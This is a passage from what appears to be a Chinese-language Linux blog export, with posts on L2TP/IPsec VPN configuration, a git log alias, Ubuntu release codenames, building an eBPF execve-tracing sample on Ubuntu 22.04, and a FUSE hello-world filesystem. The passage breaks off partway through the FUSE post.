<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net.ipv4.ip_forward = 1</span><br><span class="line">net.ipv4.conf.default.rp_filter = 0</span><br><span class="line">net.ipv4.conf.all.send_redirects = 0</span><br><span class="line">net.ipv4.conf.default.send_redirects = 0</span><br><span class="line">net.ipv4.conf.all.log_martians = 0</span><br><span class="line">net.ipv4.conf.default.log_martians = 0</span><br><span class="line">net.ipv4.conf.default.accept_source_route = 0</span><br><span class="line">net.ipv4.conf.all.accept_redirects = 0</span><br><span class="line">net.ipv4.conf.default.accept_redirects = 0</span><br><span class="line">net.ipv4.icmp_ignore_bogus_error_responses = 1</span><br></pre></td></tr></table></figure>
<p>执行<code>sudo sysctl -p</code>立即生效</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>使用<code>ipsec verify</code>验证ipsec配置。在验证前，请先重启ipsec服务<code>sudo systemctl restart ipsec</code></p>
<h2 id="L2TP配置"><a href="#L2TP配置" class="headerlink" title="L2TP配置"></a>L2TP配置</h2><p>在<code>/etc/xl2tpd/xl2tpd.conf</code>中增加</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">listen-addr = 192.168.3.100</span><br><span class="line">ipsec saref = yes</span><br><span class="line"></span><br><span class="line">[lns default]</span><br><span class="line">ip range = 192.168.3.120-192.168.3.123</span><br><span class="line">local ip = 192.168.3.100</span><br><span class="line">refuse chap = yes</span><br><span class="line">refuse pap = yes</span><br><span class="line">require authentication = yes</span><br><span class="line">name = l2tp</span><br><span class="line">ppp debug = yes</span><br><span class="line"></span><br><span class="line">pppoptfile = /etc/ppp/options.xl2tpd</span><br><span class="line"></span><br><span class="line">length bit = yes</span><br></pre></td></tr></table></figure>

<h3 id="PPP配置"><a href="#PPP配置" class="headerlink" title="PPP配置"></a>PPP配置</h3><h4 id="options配置"><a href="#options配置" class="headerlink" title="options配置"></a>options配置</h4><p>新建xl2tpd专用options，并增加内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ipcp-accept-local</span><br><span class="line">ipcp-accept-remote</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ms-dns 192.168.3.1</span></span><br><span class="line">ms-dns 8.8.8.8</span><br><span class="line">ms-dns 8.8.4.4</span><br><span class="line"></span><br><span class="line">noccp</span><br><span class="line">auth</span><br><span class="line">crtscts</span><br><span class="line">debug</span><br><span class="line">hide-password</span><br><span class="line">modem</span><br><span class="line">lock</span><br><span class="line">proxyarp</span><br></pre></td></tr></table></figure>
<h4 id="账户配置"><a href="#账户配置" class="headerlink" title="账户配置"></a>账户配置</h4><p>可复用PPTP部署中的PPP配置的账户</p>
<h3 id="重启L2TP服务"><a href="#重启L2TP服务" class="headerlink" title="重启L2TP服务"></a>重启L2TP服务</h3><p><code>sudo systemctl restart xl2tpd</code></p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.cnblogs.com/alexsun/p/5894338.html">树莓派使用pptpd搭建VPN（PPTP）服务器</a></li>
<li><a href="http://blog.csdn.net/wxlguitar/article/details/51474771">树莓派搭建L2TP&#x2F;IPSec</a></li>
<li><a href="http://www.linuxidc.com/Linux/2010-08/27616.htm">CentOS安装L2TP&#x2F;IPSEC 与简单故障处理</a></li>
<li><a href="http://struggle01.blog.51cto.com/6956448/1336029">linux下搭建Ipsec+L2TP VPN服务</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>vpn</tag>
        <tag>pptp</tag>
        <tag>ipsec</tag>
        <tag>l2tp</tag>
        <tag>ppp</tag>
      </tags>
  </entry>
  <entry>
    <title>git log 配置</title>
    <url>/2015/11/25/git/git_log/</url>
    <content><![CDATA[<h2 id="git-log-一般操作"><a href="#git-log-一般操作" class="headerlink" title="git log 一般操作"></a>git log 一般操作</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span>         查看全部提交日志</span><br><span class="line">git <span class="built_in">log</span> -2      查看最近２次的提交日志</span><br><span class="line">git <span class="built_in">log</span> -p      查看历史记录以来那些行被修改</span><br><span class="line">git <span class="built_in">log</span> --<span class="built_in">stat</span> --summary    查看每个版本变动的档案和行数</span><br></pre></td></tr></table></figure>

<hr>
<p>如果你厌倦了黑呼呼的界面，下面让你的git log色彩更丰富一些：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> --graph --pretty=format:<span class="string">&#x27;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#x27;</span> --abbrev-commit</span><br></pre></td></tr></table></figure>

<p>如果觉得觉得这么长的命令不好记，那么设个“别名”吧：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global alias.lg <span class="string">&quot;log --color --graph --pretty=format:&#x27;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#x27; --abbrev-commit&quot;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>config</tag>
      </tags>
  </entry>
  <entry>
    <title>dist-linux-codename</title>
    <url>/2017/08/28/linux/dist-linux-codename/</url>
    <content><![CDATA[<h1 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h1><h3 id="Xenial-Xerus-好客的非洲地松鼠"><a href="#Xenial-Xerus-好客的非洲地松鼠" class="headerlink" title="Xenial Xerus (好客的非洲地松鼠)"></a>Xenial Xerus (好客的非洲地松鼠)</h3><p>Ubuntu 16.04 的发布代号，简称XX。Canonical和Ubuntu的创始人马克·沙特尔沃思(Mark Shuttleworth) 在他的个人博文中写道：“这是如此的巧合幸运，我们的下个LTS应该为X，因为‘xenial’代表着主人和客人之间融洽的友好关系，而且对于推进Ubuntu OpenStack的LXD和KVM工作起到了非常积极的作用。Xerus则是非洲地松鼠，是我的祖国最为常见的动物。他们在沙漠环境中繁殖，并且以小型团体的方式生活，能够和邻居和谐生活的社会群体。”</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>eBPF开发环境搭建及示例</title>
    <url>/2024/05/24/linux/ebpf-deploy-sample/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># lsb_release -a</span></span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:	Ubuntu</span><br><span class="line">Description:	Ubuntu 22.04.4 LTS</span><br><span class="line">Release:	22.04</span><br><span class="line">Codename:	jammy</span><br><span class="line"><span class="comment"># uname -a</span></span><br><span class="line">Linux ubu22 5.15.0-100-generic <span class="comment">#110-Ubuntu SMP Wed Feb 7 13:28:04 UTC 2024 aarch64 aarch64 aarch64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<h1 id="包安装"><a href="#包安装" class="headerlink" title="包安装"></a>包安装</h1><p><em>安装软件包</em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y bison flex build-essential git cmake make libelf-dev strace tar libfl-dev libssl-dev libedit-dev zlib1g-dev  python  python3-distutils libcap-dev llvm clang</span><br></pre></td></tr></table></figure>

<h2 id="安装-bcc"><a href="#安装-bcc" class="headerlink" title="安装 bcc"></a>安装 bcc</h2><p><code>bcc</code> 是一组用于 <code>eBPF</code> 开发的工具，它包括了一组用于编写和调试 <code>eBPF</code> 程序的库和命令行工具。使用 <code>bcc</code>，可以更加方便地开发和调试 <code>eBPF</code> 程序，提高开发效率和代码质量。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install bpfcc-tools</span><br></pre></td></tr></table></figure>

<h2 id="安装-bpftool"><a href="#安装-bpftool" class="headerlink" title="安装 bpftool"></a>安装 bpftool</h2><p><code>bpftool</code> 是一个用于管理和调试 <code>eBPF</code> 代码的命令行工具。它允许你查看和分析系统中运行的 <code>eBPF</code> 程序和映射，以及与内核中的 <code>eBPF</code> 子系统进行交互。更多内容可以查看 <a href="https://github.com/libbpf/bpftool">bpftool Github</a></p>
<p>使用 <code>bpftool</code>，你可以执行以下操作：</p>
<ul>
<li>列出当前系统中所有加载的 <code>eBPF</code> 程序和映射</li>
<li>查看指定 <code>eBPF</code> 程序或映射的详细信息，例如指令集、内存布局等</li>
<li>修改 <code>eBPF</code> 程序或映射的属性，例如禁用一个程序或清空一个映射</li>
<li>将一个 <code>eBPF</code> 程序或映射导出到文件中，以便在其他系统上重新导入</li>
<li>调试 <code>eBPF</code> 程序，例如跟踪程序的控制流、访问内存等</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y linux-tools-$(<span class="built_in">uname</span> -r)</span><br></pre></td></tr></table></figure>

<p>默认情况下 <code>bpftool</code> 命令会安装到&#x2F;<code>usr/local/sbin/</code> 下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bpftool version -p</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;5.15.143&quot;</span>,</span><br><span class="line">    <span class="string">&quot;features&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;libbfd&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;skeletons&quot;</span>: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="安装linux源码"><a href="#安装linux源码" class="headerlink" title="安装linux源码"></a>安装linux源码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install linux-source-5.15.0</span><br></pre></td></tr></table></figure>

<h1 id="编译bpf-sample"><a href="#编译bpf-sample" class="headerlink" title="编译bpf sample"></a>编译bpf sample</h1><p><em>解压缩</em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/src/linux-source-5.15.0/debian</span><br><span class="line">tar -jxvf linux-source-5.15.0.tar.bz2</span><br></pre></td></tr></table></figure>

<p><em>Copy config文件</em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-source-5.15.0</span><br><span class="line"><span class="built_in">cp</span> -v /boot/config-$(<span class="built_in">uname</span> -r) .config</span><br><span class="line">make oldconfig &amp;&amp; make prepare</span><br></pre></td></tr></table></figure>


<p><em>编译Samples</em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make -C samples/bpf</span><br></pre></td></tr></table></figure>

<p>若遇到如下错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">  CC      /usr/src/linux-source-5.15.0/samples/bpf/bpftool/prog.o</span><br><span class="line">  LINK    /usr/src/linux-source-5.15.0/samples/bpf/bpftool/bpftool</span><br><span class="line">/usr/src/linux-source-5.15.0/samples/bpf/Makefile:369: *** Cannot find a vmlinux <span class="keyword">for</span> VMLINUX_BTF at any of <span class="string">&quot;  /usr/src/linux-source-5.15.0/vmlinux&quot;</span>, build the kernel or <span class="built_in">set</span> VMLINUX_BTF or VMLINUX_H variable.  Stop.</span><br><span class="line">make[1]: *** [Makefile:1911: /usr/src/linux-source-5.15.0/samples/bpf] Error 2</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/usr/src/linux-source-5.15.0&#x27;</span></span><br><span class="line">make: *** [Makefile:275: all] Error 2</span><br><span class="line">make: Leaving directory <span class="string">&#x27;/usr/src/linux-source-5.15.0/samples/bpf&#x27;</span></span><br></pre></td></tr></table></figure>

<p>说明需要 vmlinux，可以指定vmlinux再进行编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make VMLINUX_BTF=/sys/kernel/btf/vmlinux -C samples/bpf</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make VMLINUX_BTF=/sys/kernel/btf/vmlinux M=samples/bpf</span><br></pre></td></tr></table></figure>

<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>示例需要在 <code>usr/src/linux-source-5.15.0/samples/bpf</code>目录下进行编译。<code>samples/bpf</code> 下的程序一般组成方式是 xxx_user.c 和 xxx_kern.c</p>
<ul>
<li>xxx_user.c：为用户空间的程序用于设置 BPF 程序的相关配置、加载 BPF 程序至内核、设置 BPF 程序中的 map 值和读取 BPF 程序运行过程中发送至用户空间的消息等。</li>
<li>xxx_kern.c：为 BPF 程序代码，通过 clang 编译成字节码加载至内核中，在对应事件触发的时候运行，可以接受用户空间程序发送的各种数据，并将运行时产生的数据发送至用户空间程序。</li>
</ul>
<p>新建两个文件：<code>bob_user.c</code>和<code>bob_kern.c</code></p>
<p><em>bob_kern.c</em></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;uapi/linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/bpf_helpers.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/bpf_tracing.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_enter_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_prog</span><span class="params">(<span class="keyword">struct</span> pt_regs *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> fmt[] = <span class="string">&quot;bob %s !\n&quot;</span>;</span><br><span class="line">	<span class="type">char</span> comm[<span class="number">16</span>];</span><br><span class="line">	bpf_get_current_comm(&amp;comm, <span class="keyword">sizeof</span>(comm));</span><br><span class="line">	bpf_trace_printk(fmt, <span class="keyword">sizeof</span>(fmt), comm);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> _license[] SEC(<span class="string">&quot;license&quot;</span>) = <span class="string">&quot;GPL&quot;</span>;</span><br><span class="line">u32 _version <span class="title function_">SEC</span><span class="params">(<span class="string">&quot;version&quot;</span>)</span> = LINUX_VERSION_CODE;</span><br></pre></td></tr></table></figure>

<p><em>bob_user.c</em></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/libbpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;trace_helpers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> ac, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_link</span> *<span class="title">link</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> *<span class="title">prog</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_object</span> *<span class="title">obj</span>;</span></span><br><span class="line">	<span class="type">char</span> filename[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">&quot;%s_kern.o&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	obj = bpf_object__open_file(filename, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (libbpf_get_error(obj)) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ERROR: opening BPF object file failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	prog = bpf_object__find_program_by_name(obj, <span class="string">&quot;bpf_prog&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!prog) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ERROR: finding a prog in obj file failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* load BPF program */</span></span><br><span class="line">	<span class="keyword">if</span> (bpf_object__load(obj)) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ERROR: loading BPF object file failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	link = bpf_program__attach(prog);</span><br><span class="line">	<span class="keyword">if</span> (libbpf_get_error(link)) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ERROR: bpf_program__attach failed\n&quot;</span>);</span><br><span class="line">		link = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	read_trace_pipe();</span><br><span class="line"></span><br><span class="line">cleanup:</span><br><span class="line">	bpf_link__destroy(link);</span><br><span class="line">	bpf_object__close(obj);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改 <code>samples/bpf/Makefile</code></p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">tprogs-y += xdp_sample_pkts</span><br><span class="line">tprogs-y += ibumad</span><br><span class="line">tprogs-y += hbm</span><br><span class="line"><span class="comment"># 增加 user programs</span></span><br><span class="line">tprogs-y += bob</span><br><span class="line">...</span><br><span class="line">ibumad-objs := ibumad_user.o</span><br><span class="line">hbm-objs := hbm.o <span class="variable">$(CGROUP_HELPERS)</span></span><br><span class="line"><span class="comment"># 增加 objs</span></span><br><span class="line">bob-objs := bob_user.o <span class="variable">$(TRACE_HELPERS)</span></span><br><span class="line">...</span><br><span class="line">always-y += hbm_edt_kern.o</span><br><span class="line">always-y += xdpsock_kern.o</span><br><span class="line"><span class="comment"># 增加 kernel programs</span></span><br><span class="line">always-y += bob_kern.o</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make VMLINUX_BTF=/sys/kernel/btf/vmlinux M=samples/bpf</span><br></pre></td></tr></table></figure>


<p>运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd samples/bpf</span></span><br><span class="line"><span class="comment"># ./bob</span></span><br><span class="line">libbpf: elf: skipping unrecognized data section(4) .rodata.str1.1</span><br><span class="line">           &lt;...&gt;-3622529 [001] d...1 1751426.283602: bpf_trace_printk: bob sshd !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            sshd-3622530 [001] d...1 1751426.288591: bpf_trace_printk: bob sshd !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            sshd-3622531 [001] d...1 1751430.924951: bpf_trace_printk: bob sshd !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &lt;...&gt;-3622532 [000] d...1 1751430.929273: bpf_trace_printk: bob sshd !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            bash-3622532 [000] d...1 1751430.930114: bpf_trace_printk: bob bash !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &lt;...&gt;-3622533 [001] d...1 1751430.934470: bpf_trace_printk: bob sshd !</span><br></pre></td></tr></table></figure>


<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://blog.csdn.net/lizhijun_buaa/article/details/131644323">eBPF开发环境搭建</a></li>
<li><a href="https://yaoyao.io/posts/how-to-setup-ebpf-env-on-ubuntu#linux-tools">如何在 Ubuntu 上配置 eBPF 开发环境</a></li>
<li><a href="https://blog.csdn.net/baidu_29900103/article/details/131188347">基于ubuntu22.04-深入浅出 eBPF</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>ebpf</tag>
      </tags>
  </entry>
  <entry>
    <title>FUSE的使用及示例</title>
    <url>/2017/01/13/linux/filesystem-userspace-usage/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>文件系统，是任何OS都不可却少的。想要编写一个属于自己的文件系统很容易，但调试十分不方便。为了方便调试，提高开发效率，可以使用FUSE（Filesystem in userspace）框架进行开发。这是一个内核模块，能够让用户在用户空间实现文件系统并且挂载到某个目录，就像在内核实现的文件系统一样。使用 FUSE 有几个好处：一是因为在用户空间实现，开发和调试都比较方便；二是可以把一些常用的服务以文件系统的形式展现，方便操作，如 ftpfs，sshfs，mailfs 等；另外可以避免一些版权问题，如 Linux 上对 ntfs，zfs 的操作都是通过 FUSE 实现的。当然用户空间的实现也有缺点，最明显的就是由多次在用户态&#x2F;内核态切换带来的性能下降。</p>
<h1 id="FUSE架构"><a href="#FUSE架构" class="headerlink" title="FUSE架构"></a>FUSE架构</h1><p><img src="/images/linux/fuse.png" alt="FUSE Frame"><br>将文件系统需要处理的读、写、创建、删除等函数，以回调的方式注册到FUSE模块中，当用户访问挂载目录时，FUSE模块回调相应的注册接口。</p>
<h1 id="FUSE安装"><a href="#FUSE安装" class="headerlink" title="FUSE安装"></a>FUSE安装</h1><h2 id="ubuntu-16-04-安装"><a href="#ubuntu-16-04-安装" class="headerlink" title="ubuntu 16.04 安装"></a>ubuntu 16.04 安装</h2><p>需要安装<code>libfuse2</code>和<code>libfuse-dev</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libfuse2 libfuse-dev pkg-config</span><br></pre></td></tr></table></figure>
<p>版本:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FUSE library version: 2.9.4</span><br><span class="line">fusermount version: 2.9.4</span><br><span class="line">using FUSE kernel interface version 7.19</span><br></pre></td></tr></table></figure>

<h2 id="OSX-10-11-6-安装"><a href="#OSX-10-11-6-安装" class="headerlink" title="OSX 10.11.6 安装"></a>OSX 10.11.6 安装</h2><p>需要安装<code>Caskroom/cask/osxfuse</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">brew cask install osxfuse</span><br></pre></td></tr></table></figure>
<p>版本:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">OSXFUSE 3.5.4</span><br><span class="line">FUSE library version: 2.9.7</span><br><span class="line">fuse: no mount point</span><br></pre></td></tr></table></figure>

<h1 id="FUSE使用"><a href="#FUSE使用" class="headerlink" title="FUSE使用"></a>FUSE使用</h1><p>FUSE有两种接口，一种是<code>fuse_operations</code>另一种是<code>fuse_lowlevel_ops</code>。</p>
<ul>
<li><code>fuse_operations</code>是较为上层的接口，我们可以使用<code>fuse_main</code>函数将其传入FUSE中<br>  eg:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">fuse_operations</span> cryptfs_ops = &#123;</span><br><span class="line">        .init = cfs_init,</span><br><span class="line">        .destroy = cfs_destroy,</span><br><span class="line">        .open = cfs_open,</span><br><span class="line">        .read = cfs_read,</span><br><span class="line">        .write = cfs_write,</span><br><span class="line">        .release = cfs_release,</span><br><span class="line">        .readdir = cfs_readdir,</span><br><span class="line">        .getattr = cfs_getattr,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li><code>fuse_lowlevel_ops</code>是较底层的接口，我们可以使用<code>fuse_session_loop</code>函数实现<br>  eg:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">fuse_lowlevel_ops</span>  lowlevel_handler =   </span><br><span class="line">&#123;  </span><br><span class="line">        .lookup   = lowlevel_lookup,  </span><br><span class="line">        .getattr  = lowlevel_getattr,  </span><br><span class="line">        .readdir  = lowlevel_readdir,  </span><br><span class="line">        .mkdir    = lowlevel_mkdir,  </span><br><span class="line">        .rmdir    = lowlevel_rmdir,  </span><br><span class="line">        .open     = lowlevel_open,  </span><br><span class="line">        .read     = lowlevel_read,  </span><br><span class="line">        .write    = lowlevel_write,  </span><br><span class="line">        .unlink   = lowlevel_unlink,  </span><br><span class="line">        .rename   = lowlevel_rename,  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<code>fuse_operations</code>使用简单，容易上手。<code>fuse_lowlevel_ops</code>灵活性大，需要有FS开发经验。</li>
</ul>
<h2 id="Helloworld示例"><a href="#Helloworld示例" class="headerlink" title="Helloworld示例"></a>Helloworld示例</h2><p>实现<code>ls ./mp</code>系统提示<code>Hello-world</code>(<code>./mp</code>为挂载目录)<br><code>ls</code>会用到的方法代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fuse.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">cfs_readdir</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path, <span class="type">void</span>* buf, <span class="type">fuse_fill_dir_t</span> filler, <span class="type">off_t</span> offset, <span class="keyword">struct</span> fuse_file_info* fi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(prd-&gt;logfile, <span class="string">&quot;cfs_readdir\t path : %s\n&quot;</span>, path);</span><br><span class="line">    <span class="built_in">fflush</span>(prd-&gt;logfile);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">filler</span>(buf, <span class="string">&quot;Hello-world&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">cfs_getattr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path, <span class="keyword">struct</span> stat *stbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(prd-&gt;logfile, <span class="string">&quot;cfs_getattr\t path : %s\n&quot;</span>, path);</span><br><span class="line">    <span class="built_in">fflush</span>(prd-&gt;logfile);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(path, <span class="string">&quot;/&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        stbuf-&gt;st_mode = <span class="number">0755</span> | S_IFDIR;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        stbuf-&gt;st_mode = <span class="number">0644</span> | S_IFREG;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>fuse_main</code>将接口注册到FUSE中:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">fuse_operations</span> cryptfs_ops = &#123;</span><br><span class="line">    .readdir = cfs_readdir,</span><br><span class="line">    .getattr = cfs_getattr,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    ret = <span class="built_in">fuse_main</span>(argc, argv, &amp;cryptfs_ops);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><h3 id="ubuntu-16-04"><a href="#ubuntu-16-04" class="headerlink" title="ubuntu 16.04"></a>ubuntu 16.04</h3><p>编译命令:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc myfuse.c -o myfuse -DFUSE_USE_VERSION=22 `pkg-config fuse --cflags --libs` -g</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc myfuse.c -o myfuse -DFUSE_USE_VERSION=22 -D_FILE_OFFSET_BITS=64 -I/usr/include/fuse -lfuse -pthread -g </span><br></pre></td></tr></table></figure>
<p>使用后者编译时不需要安装包<code>pkg-config</code>，由于不同操作系统fuse安装位置不一样，所以还是推荐使用<code>pkg-config</code>的方式</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>可使用GDB调试，<code>myfuse</code>会以守护进程方式启动，调试有三种方法。</p>
<ul>
<li>待<code>myfuse</code>进程启动后，使用GDB中的<code>attach</code>方法进行调试</li>
